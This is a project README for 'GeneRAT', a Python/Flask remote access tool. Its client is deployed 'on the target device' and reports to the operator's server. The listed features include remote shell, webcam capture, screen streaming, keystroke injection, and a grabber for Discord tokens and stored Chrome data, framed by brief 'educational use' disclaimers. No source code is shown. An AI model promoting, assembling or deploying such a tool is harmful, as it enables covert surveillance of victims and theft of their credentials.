# GeneRAT

## ⚠️ Disclaimer
This software is intended for educational and ethical use only. Unauthorized access to computer systems without proper consent is illegal. The developer is not responsible for any misuse of this tool.

## 📌 Overview
GeneRAT is a Remote Administration Tool (RAT) that allows users to interact with remote devices via a Flask-based server and a Python client. The server provides a web-based dashboard to execute commands on connected devices, capture screenshots, stream live screens, collect system information, and more.

## 🚀 Features
- **Remote Shell Execution**: Run shell commands on remote devices.
- **Live Screen Streaming**: View real-time screenshots from the remote system.
- **File Management**: Upload and download files.
- **Webcam Capture**: Take pictures using the remote system's webcam.
- **Key Input Simulation**: Send keystrokes to the remote machine.
- **Mouse Control**: Move the mouse cursor remotely.
- **IP and System Info**: Fetch system details and public IP address.
- **Discord Token & Chrome Data Grabber**: Retrieve stored browser data and Discord tokens.
- **CMD Spammer**: Open multiple CMD windows on the remote system.

## 🛠️ Installation

### Server Setup (Flask Backend)
1. Install dependencies:
   ```sh
   pip install flask flask-login flask-socketio werkzeug requests
   ```
2. Run the server:
   ```sh
   python server.py
   ```
3. Access the web panel at `http://localhost:5000`.

### Client Setup (Python Agent)
1. Install dependencies:
   ```sh
   pip install requests socketio pyautogui psutil opencv-python pyttsx3
   ```
2. Run the client script:
   ```sh
   python main.py
   ```

## 🔧 Configuration
Modify `main.py` to change the `VPS_URL` variable to point to your server:
```python
VPS_URL = "http://your-server-ip:5000"
```

## 📜 Usage
1. Start the server (`server.py`).
2. Deploy the client (`main.py`) on the target device.
3. Use the web dashboard (`index.html`) to interact with the connected clients.

## 📂 File Structure
```
/
├── server.py      # Flask-based backend
├── main.py        # Client-side script (Python agent)
├── index.html     # Web-based UI for controlling devices
├── styles.css     # UI styling
└── README.md      # Documentation
```

## 🛑 Legal & Ethical Considerations
GeneRAT should only be used on devices you own or have explicit permission to control. Unauthorized access to computer systems is illegal and punishable by law.

## 👤 Author
Developed by **[Your Name]**

## 📄 License
This project is released under the **MIT License**.

